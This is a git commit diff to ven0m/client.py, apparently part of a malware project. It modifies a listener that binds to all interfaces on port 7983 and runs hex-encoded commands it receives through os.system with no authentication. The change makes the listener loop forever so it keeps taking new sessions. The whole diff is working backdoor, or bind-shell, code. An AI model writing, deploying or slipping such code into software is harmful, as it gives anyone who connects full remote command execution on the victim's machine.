ef767aa0921482e9ff719f48acb5d63f95c6e164
Sam Burton <sam.burton271@gmail.com>
2024-09-03 11:49:03 -0400

    Made core changes to how listener functions.

--- ven0m/client.py
+++ ven0m/client.py
@@ -3,19 +3,21 @@ import os
 import socket
 def main():
     sock = socket.create_server(("0.0.0.0", 7983))
-    length = 1
-    while(length != 0):
+    sock.listen()
+    while(True):
         connArray = sock.accept()
         conn = connArray[0]
-        hexMessage = conn.recv(4096).decode('utf-8')
-        message = bytes.fromhex(hexMessage).decode('utf-8')
-        if(message == "CMD"):
-            length = 1
-            while(length != 0):
-                hexMessage = conn.recv(4096).decode('utf-8')
-                message = bytes.fromhex(hexMessage).decode('utf-8')
-                if(message.lower() == "exit"):
-                    length = 0
-                if(length != 0):
-                    os.system(message)
+        length = 1
+        while(length > 0):
+            hexMessage = conn.recv(4096).decode('utf-8')
+            message = bytes.fromhex(hexMessage).decode('utf-8')
+            if(message == "CMD"):
+                length = 1
+                while(length != 0):
+                    hexMessage = conn.recv(4096).decode('utf-8')
+                    message = bytes.fromhex(hexMessage).decode('utf-8')
+                    if(message.lower() == "exit"):
+                        length = 0
+                    if(length != 0):
+                        os.system(message)
 main()
